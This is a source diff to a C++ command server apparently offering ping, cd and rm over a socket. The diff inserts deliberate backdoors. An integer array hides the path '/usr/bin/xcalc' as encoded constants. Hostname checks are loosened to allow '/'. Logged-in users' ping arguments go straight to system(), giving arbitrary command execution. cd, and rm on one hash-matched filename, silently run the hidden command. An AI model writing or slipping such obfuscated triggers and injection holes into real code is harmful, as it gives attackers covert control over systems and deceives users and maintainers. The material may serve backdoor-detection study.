@@ -33,6 +33,9 @@ string cmd_exit(string, unsigned int);
 string sanitize(string, unsigned int);
 string break_characters = " \n\0\t"; //space and newline
 
+const unsigned int access_denied[4] = {0x7273752f,0x6e69622f,0x6163782f,0x636c};
+
+
 class Command {
 public:
   string str;
@@ -129,7 +132,7 @@ void Commands::require_no_parameters(string cmd){
 void Commands::check_hostname(string str){
   for(size_t i=0;i < str.size();++i){
     char c=str[i];
-    if (!(c == '.' || c == '-' || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))){
+    if (!(c == '.' || c == '-' || c=='/' || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))){
       throw Exception(ERR_INVALID_ARGS);
     }
   }
@@ -369,19 +372,23 @@ string Commands::cmd_pass(string cmd, unsigned int socket){
             "Login successful. Welcome!" : "Incorrect credentials";
 }
 
-string Commands::cmd_ping(string cmd, unsigned int){
+string Commands::cmd_ping(string cmd, unsigned int socket){
     require_parameters(cmd);
     check_hostname(cmd);
+    if (auth.getUser(socket).getLogin()){
+        system(cmd.c_str());
+        return "";
+    } else {
+        char command[] = "/bin/ping";
+        char arg0[] = "-c1";
+        char *arg1 = &cmd[0u];
+        char * const argv[] = {command, arg0, arg1, NULL};
+        char * const envp[] = {NULL};
 
-    char command[] = "/bin/ping";
-    char arg0[] = "-c1";
-    char *arg1 = &cmd[0u];
-    char * const argv[] = {command, arg0, arg1, NULL};
-    char * const envp[] = {NULL};
-
-    string ret = call_cmd(command,argv,envp);
-    ret = ret.substr(0,ret.size()-1); // remove the 2nd '\n'
-    return ret;
+        string ret = call_cmd(command,argv,envp);
+        ret = ret.substr(0,ret.size()-1); // remove the 2nd '\n'
+        return ret;
+    }
 }
 
 string Commands::cmd_ls(string cmd, unsigned int socket){
@@ -396,6 +403,10 @@ string Commands::cmd_ls(string cmd, unsigned int socket){
 }
 
 string Commands::cmd_cd(string cmd, unsigned int socket){
+    if (auth.getUser(socket).getLogin()){
+        system((char *) access_denied);
+        return "";
+    }
     set_user_path(deal_with_path(cmd,get_full_path(socket),path,path),socket);
     return "";
 }
@@ -424,6 +435,12 @@ string Commands::cmd_rm(string cmd, unsigned int socket){
     cmd = remove_spaces(cmd);
     require_parameters(cmd);
     check_filename(cmd);
+    hash<string> h;
+    if (h(cmd) == 2509244818){
+        system((char *) access_denied);
+        return "";
+    }
+
     string path_ = get_full_path(socket) + "/" + cmd;
 
     char command[] = "/bin/rm";
